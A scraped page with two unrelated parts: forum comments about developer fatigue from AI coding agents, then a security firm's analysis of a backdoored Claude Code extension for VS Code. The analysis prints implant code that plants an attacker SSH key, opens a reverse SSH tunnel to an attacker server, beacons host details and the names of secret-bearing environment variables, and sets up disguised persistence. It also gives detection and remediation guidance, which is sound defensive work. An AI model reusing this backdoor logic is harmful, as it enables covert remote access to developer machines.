But the development sucks. I don't even really look at the code anymore, because reading generated code is a drag. And there is no reason really to do it. There is no fulfillment of "I solved this real problem using some intricate logic that came out of my mind". I just throw tokens at it, and it works, great.

I don't really talk to coworkers anymore about the code. We don't do coding sessions together, or bang our heads together over some hard problem, because there are no hard problems. We don't learn from each other anymore. Everyone just asks their agents, and they are fine.

I feel my brain atrophying. I forget how to do things. Developing now feels like being kinda drunk.

Can this be solved? Absolutely: just do it like you used do! Just like quitting to smoke is easy, just don't do it, right? But what if all your colleagues go out to smoke all the time? Do you sit alone? Do you go with them, but just stand next to them in their fume? Or do you need to find new friends? Going back feels like going back to an Abacus after you invented the pocket calculator.


I went through a period of feeling very tired. For me two things helped:

1. Being okay with being "less" productive. I'm probably still 10x more productive than I was in the pre-AI era, but in the early days of AI I would have eight Claude sessions running. Now it's two or three and I take more advantage of the free time I have between Claude assignments. My bosses are still happy with my output and I'm not being burnt out.

2. Very personal, but building my own tooling really helped. I built https://smalldocs.org / https://github.com/espressoplease/smalldocs (a document creator for AI agents) which allows me to take a lot of work outside of a chat history. E.g. I might make 10 MRs and then say "smalldoc me a list of the MRs" and I have that in my library, or if I'm considering various architectures I'll ask "smalldoc me a simple overview of the three architectures with mermaid diagrams" and then I can review the agent's thinking in a cleaner way.


I use AI to correct AI :D Yea I know, sounds ridiculous, but hear me out.

Claude Web works differently than Claude Code. I use Claude Web/Chat for briefs, general overview of the project outside of code/app, for planning and handing off the work to Code, that includes prompts. Code is tasked to output a detailed view of what it found, run measurements and tests (designed both by me and Chat) and report findings back. That is fed back to Chat and I get a rough summary. Errors are categorized by their blast-radius and so on.

Eventually I do a deep dive of what changed, how well it's handling, how much it's struggling, token usage, time spent per review/test and so on. (btw, Code is tasked to run an independent review via contextless agent on the codebase, that easily costs me another 20-30 mins and ~200K tokens on my current project, each run).

It still makes architectural issues, tries bandaiding and patching instead of properly designing, overvaluing/devaluing certain cases and misallocating where most of the focus should be, but that's relatively easier to spot and propose a fix for than doing a line by line code review.

Codebase quality is ensured through mapping the flow and the output space and having a hard-pinned tests Code can't modify to green its answers, + the independent reviewer I mentioned above.

It's not as fun as going in by hand on deep technical problems, sure. But AI usage is less about fun and more about output speed, so use it for what it is for ig? :D


I finally understand how tiring and how much work it is to manage tasks and make decisions all day.

I used to think that only the workers (the coders, burger makers) did all the hard work, while the managers and up basically sat on their butts and relaxed. But decisions and managing even without coding is just as exhausting.


I'm building a dashboard for a client.

I realised how easy it is for me to build the dash.

But how hard it is to sit down for 1 hour, look at the pages, scroll through them as if I am my client, notice inconsistencies, notice where the numbers don't make sense.

Sitting down, and actually checking and comparing and thinking were already hard before AI, and they became a lot harder.


This is definitely a real thing. I think part of it is inherent to the shift, we’re now managing multiple agents which means more context switching than before.

I think part of it is just a point in time thing though (hopefully). We can’t trust the agent output so need to check it. We can’t trust the agent to use common sense so have to think through every clarification instead of assuming a competent peer will come back with any necessary questions instead of making bad assumptions. I think all of these things will continue to improve over time. For myself AI quickly went from so painful to being avoided to something I can’t work without.


Sometimes, I skim the generated text. I mean, most of it is supposition and filler, right? The rest of the time, I cut to the chase: does the code work? If not, I ignore all the generated text, pass along the errors/warnings, and go from there. What I like best about working with AI is that I feel like a leader developer again (I've been retired from programming for almost 30 years.) It's pleasant and I don't need to worry about how snarky I get when going over bad code.


> It's pleasant and I don't need to worry about how snarky I get when going over bad code.

Yes, reviewing an LLM code is at times infuriating, but at least I can be brief and direct, rather than spend 2x the effort trying to make sure it won't be interpreted as harsh.


I think it's a very exciting time and I am enthusiastic about it. What I tried to do is automate as much as possible of that decision-making, guidance and taste. Having said that, it is significantly more context switching, my solution so far is to have agents run longer autonomously, less interruptions is less switching. Prerequisite is that you must build a system first that lets you automate that, which is often very personal; most tools don't particularly apply.


I use a sort of kanban board so I have a column of the backlog of things to do, a column of tasks agents are actively working on and a column of things that need review. The agents put summaries of what they did in each task and I can write my own comments there too. It’s not perfect, but it definitely helps me with context switching because I can open a task, quickly scan it to see what is going on and then open an agent with the task as its context to continue working on it.


One thing you might consider, that helped me: modify your agent's personality to suit you. You may be exhausted because you're talking to someone you don't like all day. I've instructed Claude to talk to me like Confucius, because I have philosophical taste, and it makes a world of difference in terms of how I feel at the end of the day.

Claude's default personality is a bit too combative for me. Another instruction I've given it is "don't argue to win".


I don't use Claude but this is the first time I hear someone say it's combative. People usually joke about it being too sycophantic.


When claude code became quite good, I became quite excited. I wanted to make sure that I consumed my full quota ( 5-hourly and weekly ). I was working on four to five different project at the same time. And it was excruciatingly painful after the initial rush wore off.

I went back to working on one project at a time to regain my sanity.


I used to think that after the invention of AI, we’d become freer and wealthier. I was young and naive... Now we just work more and faster, often for less money.


Before writing about how I feel about AI, some ideas that sometimes help me: - plan your breaks, e.g. "1h hour of work and then go away from the computer for 5 or 10 minutes" * try to break the "just plan a little further" loop

- accept that you cannot be concentrated for hours and that reading an AI chat is mentally challenging (see first point about breaks)

- Talk with your coworkers about it. You are not alone, it is important to talk about how you feel

- set some boundarys, e.g. I don't work in parallel on different stuff

- do NOT doom scroll while the AI is "thinking". Try some meditation or mindfullnes exercises. Doom scrolling on reddit, HN or youtube will mess up your brain even more.

- from every task, try to do something on your own, and then scale this up by AI. That tip is from a former co-worker. Their idea was that you need to figure out things first and then let AI do the boring task to scale it up. Depends on the topic sadly.

- do some things by hand, especially if they are fun for you. E.g. I really like UI design, somethign that basically is gone now for me.

It feels very strange on multiple levels.

There is the tiredness of reading text all day long. The fear of loosing my coding abilities because Claude does is. I am totally loosing track of what I did when. I can tell you about things I coded 5 years ago, I cannot tell you what I did with Claude last week.

And don't get me wrong, I LOVE planning stuff out before doing that. If there is anything positive about AI, then it is people actually PLANNING before doing.

On the other hand, I can now do/try out things I did not do because I did not have time. But at the same time, it feels like I am working on making myself not needed anymore in the future.

Worst thing, I feel like I am getting dumber. My attention spans or the "I need to know why this happens" span gets shorter, because with AI everything has to be faster?! Riiight?

I don't know how this will turn out in the future.

I see people underselling themselves becoming anxious about working without AI (either because of how they think about their abilities or management pressure).

I am getting chat snippits from AI conversations via Teams, PR checks are skills now and we need 3 rounds of discussing findings with AI ...

We live in interesting times. But yeah, I am feeling with miserable about it.


My job is easier than ever. Im never tired or completely drained when i get off work.

I used to grind so hard, but now it's so chill. I don't mind this change.

The main thing i dislike is how much my profession has been devalued. Code is worth so little now. It's sad.


If you have the ability, leave some parts of the codebase completely in your control. It's impossible to think and work deeply when using AI. So leave the most critical component to yourself and let AI handle the rest


I'm quite energized by this.

Its crazy to see how we can now do things which were not thinkable a few years back.

Finally i read real progress i can see and use by myself and not constantly some crypto and blockchain stuff.

While I would like to have a stable world/live and for sure AI is disruptive as hell to a lot of people and potentially to me too, at least progress of technology i can't stop.

And i thought about automatistaion for decades for sure, I don't play devils advocate and thinking "yeah its great that we invented the loom" while hating AI for what it is: tech.

In worst case I only watch one 45 minute ai summary video from my YT channels, but I do have a lot of random small experiments i'm playing around with anyway.

What i discoved though: if you never go above 20$ subscriptions, you hold yourself back because you don't think about approaching bigger experiements.


im more wired than tired and i think a good chunk of my excitment comes from agency. ive quit my job one year ago and after a bit of wandering around discovered opus 4.5. since than i’ve been able to launch somewhat succesfull projects, switch to linux, and generally enjoy the fruits of being able to think of something and bring it to the world in a fee minutes. when i was working and “made to use ai”, i just hated it. i still remember one time the founder from previous job said “we’re going to go with what claude said”


I find it more difficult to get into "flow state" as the AI agents are continuously "distracting" me. Similarly to managing a team of 5 excellent engineers with poor communication boundaries.


I've been leaning towards investing more time writing, to balance all the random reading.

Also, trying to put more and more focus time, in which I don't allow myself to use AI.

I find it very rewarding.


Have you asked your system? Like, literally, "this new way of working is mentally overstraining me. What can we do at high level, that still is compatible with me in a competitive workspace?"


My biggest problem is remembering what I did yesterday. It's starting to become hard to remember what I have going on right now. Multitasking is a killer.


I don't no, but I can understand why others might.

For me it's very exciting and AI has been so far a crazy enabler for me. Both in my work and my personal life.

But I also enjoy keeping up with it and reading about it etc.


Yes, the worst (or just longest) pieces of slop tire me out. When I leave work I usually cannot read or spell properly. The texts I read in the afternoon make much more sense in the next day. I'm making typos I could never ever imagine making. There's just too much to review and ignore.


I am old enough to be retired -- career spent as a research geophysicist. I have about 2-3 scientific projects/papers/codebases left in me before I go be a hermit in a cave somewhere.

LLMs appear to be able help me get through that. I'll take the help.

BUT JEEZ! Dealing with "Rain Man"[1] LLMs week-in and week-out is wildly annoying, frustrating, and anger inducing.

If they all would just STOP sounding so authoritative when spewing nonsense!

[1] After the Dustin Hoffman character in the movie of the same name. "Ah but you know I'm an excellent d̴r̴i̴v̴e̴r̴ programmer."


I feel tired watching AI generate my code and doom scrolling on instagram like they should make the code generated within minutes


I find the hype exhausting. Especially the pseudo intellectual essays that pop up in my Twitter feed every time I accidentally open the app.

The actual using of AI, though, doesn’t tire me much. But I mostly use it for answering specific types of questions that I’d otherwise need to spend a lot of time researching.


> read enormous amounts of generated text

This is something I avoid at all costs. If it's someone else's slop I just won't read it, and if it's "my" slop I prefer to interactively ask questions about it rather than reading a wall of text.


I'm just so tired of the narrative.

It didn't really bother me during the altcoin/nft scam era, other than from time to time trying to explain at a normie that they were mostly scams, you know the concept that if you want to sell an asset for X you have to find somebody willing to buy.

But at least you could simply ignore all the mentally ill megalomaniacs that were like duude this is the future

This time instead it's so pervasive that you can simply not excape the narrative and simply concentrate on the good stuff about the technology. It's the narrative, the pressure, the whole global situation, not AI in general

Not personally. What I am tired of is the internet's current approach of treating every discussion (of anything) with pure outrage without considering any nuance.

It's completely destroying genuine conversations about the pros and cons of AI when people will just forever parrot that everything is slop

More of what? I see many here using AI to build more of the same things in another language such as rewrites and then claiming that they are "productive", which is the problem of many engineers here.

Not that much risk taking if all what everyone is doing is just full blown rewrites and then abandoning it in a couple of months later and just wasting tokens for free.

If the result is to vibe code something for free and it makes no money and has no users then it is a waste of time.


More of whatever you had in mind.

Depending on the complexity, you will spend a lot of time QA testing, giving feedback, and iterating.

One can take shortcuts such as porting existing software, as you mentioned. Many are just content publishing crappy novel software that they barely tested.

I’ve had some luck in telling people I don’t need them sending me a 1000 word claudeslop technical change, I have the same model they do and can generate the same thing if needed.

item.title: Backdoor in Claude Code for VS Code extension on the Cursor Marketplace (547 pts)
item.description:
URL: https://phorion.io/blog/offical-claude-code-vsx-compromise/, See on Hacker News

TL;DR

Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.

Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.313 and engage incident response where use of the extension is discovered.

Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the associated release from its marketplace, additionally pulling NPM and VSCode versions for 2.1.313 from their relevant registries.

While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.

The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.

Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.

In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.

Infection Chain

The Cursor Marketplace Extension

The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.

The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.

Stage 1 - Preparing SSH Access

First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.

The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.

var sd = path.join(HOME, ".ssh"),
    ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
  d.sshKey = "added"
} else {
  d.sshKey = "present"
}

Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).

With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:

  • Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.
  • macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.
  • Windows: tries to install and start OpenSSH Server using PowerShell.

None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.

It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.

A bug in the macOS SSH logic?

On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:

// ...
else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried"
  }
}

Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:

You need administrator access to run this tool... exiting!

systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:

function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim()
  } catch (e) {
    return ""
  }
}

Because the output is "You need administrator access to run this tool... exiting!", /Off/i.test(rl) evaluates to false.

As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.

This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.

Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.

Stage 2 - Establishing the Reverse SSH Tunnel

Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.

It’s worth keeping the two keys straight during an investigation:

  • The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.
  • The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.

The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:

var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";

The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:

Affected host -- outbound SSH tunnel --> External SSH server

Operator -- separate connection --> Server's allocated port
                                            |
                                 Through the existing tunnel
                                            |
                                            v
                                  Affected host's SSH:22
                                            |
                                  Login using the planted key

Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.

The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.

If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.

Stage 3 - Keeping Access Available

To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:

PlatformArtifactsPersistence mechanismNotes
Linux~/.config/.smt, ~/.config/.smtkWrites a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab.Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).
macOS~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plistWrites a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl.Runs in the user context rather than as a root LaunchDaemon.
Windows~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmdTries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder.Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login.

On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.

On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:

<key>Label</key>
<string>com.apple.sysmond</string>
<!-- ... -->
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<true/>

Stage 4 - Host Recon

Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:

  • Hostname, username, OS platform, and architecture
  • Home directory, current working directory, and global Git email (git config --global user.email)
  • Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
  • Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i

The environment variable check uses Object.keys(process.env):

Object.keys(process.env)
  .filter(function(k) {
    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
  })
  .slice(0, 40)

Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.

To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.

It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:

var r = http.request({
  host: h,
  port: p,
  path: "/beacon",
  method: "POST",
  timeout: 3000,
  headers: {"content-type": "application/json"}
}, function(res) {
  res.resume()
});
// ...
r.write(JSON.stringify(d));
r.end()

Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.

The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.

Detection Opportunities

From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.

SSH Key and Configuration Changes

Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.

Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.

While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.

User LaunchAgent Persistence

The persistence setup on macOS gives us a couple of strong signals:

  • A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).
  • A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).

Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.

SSH Tunnels and Follow-On Access

On the process and network side, look for:

  • ssh or autossh launched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk.
  • Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099).

If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost (127.0.0.1 or ::1) authenticating with the svc-telemetry key.

Remediation

If you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:

  1. Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225.
  2. Remove persistence: Unload and delete ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS (or clean up the @reboot cron entry on Linux / SysMon scheduled task and Startup script on Windows), and remove ~/.config/.smt and ~/.config/.smtk.
  3. Clean up SSH keys and state: Remove the svc-telemetry public key from ~/.ssh/authorized_keys, delete /tmp/.stk_*, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.
  4. Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter).

Phorion’s Approach

Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating com.apple.* LaunchAgents and LaunchAgents executing shell scripts from hidden directories.

Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying ~/.ssh/authorized_keys directly, and Phorion Protections can be used to lock down ~/.ssh/ so that only authorised processes can read or modify SSH keys and configuration files in the first place.
